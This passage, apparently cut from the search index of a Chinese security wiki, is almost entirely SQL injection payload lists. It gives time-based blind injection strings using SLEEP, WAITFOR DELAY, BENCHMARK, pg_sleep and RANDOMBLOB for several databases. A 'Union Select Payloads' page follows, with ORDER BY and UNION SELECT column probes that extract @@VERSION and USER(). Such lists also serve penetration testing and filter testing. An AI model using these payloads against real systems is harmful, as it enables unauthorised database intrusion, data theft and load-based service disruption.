sleep(5)# \")) or sleep(5)=\" ')) or sleep(5)=' ;waitfor delay '0:0:5'-- );waitfor delay '0:0:5'-- ';waitfor delay '0:0:5'-- \";waitfor delay '0:0:5'-- ');waitfor delay '0:0:5'-- \");waitfor delay '0:0:5'-- ));waitfor delay '0:0:5'-- '));waitfor delay '0:0:5'-- \"));waitfor delay '0:0:5'-- benchmark(10000000,MD5(1))# 1 or benchmark(10000000,MD5(1))# \" or benchmark(10000000,MD5(1))# ' or benchmark(10000000,MD5(1))# 1) or benchmark(10000000,MD5(1))# \") or benchmark(10000000,MD5(1))# ') or benchmark(10000000,MD5(1))# 1)) or benchmark(10000000,MD5(1))# \")) or benchmark(10000000,MD5(1))# ')) or benchmark(10000000,MD5(1))# pg_sleep(5)-- 1 or pg_sleep(5)-- \" or pg_sleep(5)-- ' or pg_sleep(5)-- 1) or pg_sleep(5)-- \") or pg_sleep(5)-- ') or pg_sleep(5)-- 1)) or pg_sleep(5)-- \")) or pg_sleep(5)-- ')) or pg_sleep(5)-- AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)-- AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)# SLEEP(5)# SLEEP(5)-- SLEEP(5)=\" SLEEP(5)=' or SLEEP(5) or SLEEP(5)# or SLEEP(5)-- or SLEEP(5)=\" or SLEEP(5)=' waitfor delay '00:00:05' waitfor delay '00:00:05'-- waitfor delay '00:00:05'# benchmark(50000000,MD5(1)) benchmark(50000000,MD5(1))-- benchmark(50000000,MD5(1))# or benchmark(50000000,MD5(1)) or benchmark(50000000,MD5(1))-- or benchmark(50000000,MD5(1))# pg_SLEEP(5) pg_SLEEP(5)-- pg_SLEEP(5)# or pg_SLEEP(5) or pg_SLEEP(5)-- or pg_SLEEP(5)# '\\\" AnD SLEEP(5) AnD SLEEP(5)-- AnD SLEEP(5)# &&SLEEP(5) &&SLEEP(5)-- &&SLEEP(5)# ' AnD SLEEP(5) ANd '1 '&&SLEEP(5)&&'1 ORDER BY SLEEP(5) ORDER BY SLEEP(5)-- ORDER BY SLEEP(5)# (SELECT * FROM (SELECT(SLEEP(5)))ecMj) (SELECT * FROM (SELECT(SLEEP(5)))ecMj)# (SELECT * FROM (SELECT(SLEEP(5)))ecMj)-- +benchmark(3200,SHA1(1))+' + SLEEP(10) + ' RANDOMBLOB(500000000/2) AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) RANDOMBLOB(1000000000/2) AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-27 23:19:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/sql/sql注入payloads/通用 Union Select Payloads.html":{"url":"安全技术/sql/sql注入payloads/通用 Union Select Payloads.html","title":"通用 Union Select Payloads","keywords":"","body":"通用 Union Select Payloads ORDER BY SLEEP(5) ORDER BY 1,SLEEP(5) ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')) ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 ORDER BY SLEEP(5)# ORDER BY 1,SLEEP(5)# ORDER BY 1,SLEEP(5),3# ORDER BY 1,SLEEP(5),3,4# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30# ORDER BY SLEEP(5)-- ORDER BY 1,SLEEP(5)-- ORDER BY 1,SLEEP(5),3-- ORDER BY 1,SLEEP(5),3,4-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION ALL SELECT 1 UNION ALL SELECT 1,2 UNION ALL SELECT 1,2,3 UNION ALL SELECT 1,2,3,4 UNION ALL SELECT 1,2,3,4,5 UNION ALL SELECT 1,2,3,4,5,6 UNION ALL SELECT 1,2,3,4,5,6,7 UNION ALL SELECT 1,2,3,4,5,6,7,8 UNION ALL SELECT 1,2,3,4,5,6,7,8,9 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 UNION ALL SELECT 1# UNION ALL SELECT 1,2# UNION ALL SELECT 1,2,3# UNION ALL SELECT 1,2,3,4# UNION ALL SELECT 1,2,3,4,5# UNION ALL SELECT 1,2,3,4,5,6# UNION ALL SELECT 1,2,3,4,5,6,7# UNION ALL SELECT 1,2,3,4,5,6,7,8# UNION ALL SELECT 1,2,3,4,5,6,7,8,9# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30# UNION ALL SELECT 1-- UNION ALL SELECT 1,2-- UNION ALL SELECT 1,2,3-- UNION ALL SELECT 1,2,3,4-- UNION ALL SELECT 1,2,3,4,5-- UNION ALL SELECT 1,2,3,4,5,6-- UNION ALL SELECT 1,2,3,4,5,6,7-- UNION ALL SELECT 1,2,3,4,5,6,7,8-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION SELECT @@VERSION,SLEEP(5),3 UNION SELECT @@VERSION,SLEEP(5),USER(),4 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 UNION SELECT @@VERSION,SLEEP(5),\"'3 UNION SELECT @@VERSION,SLEEP(5),\"'3'\"# UNION SELECT @@VERSION,SLEEP(5),USER(),4# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30# UNION ALL SELECT USER()-- UNION 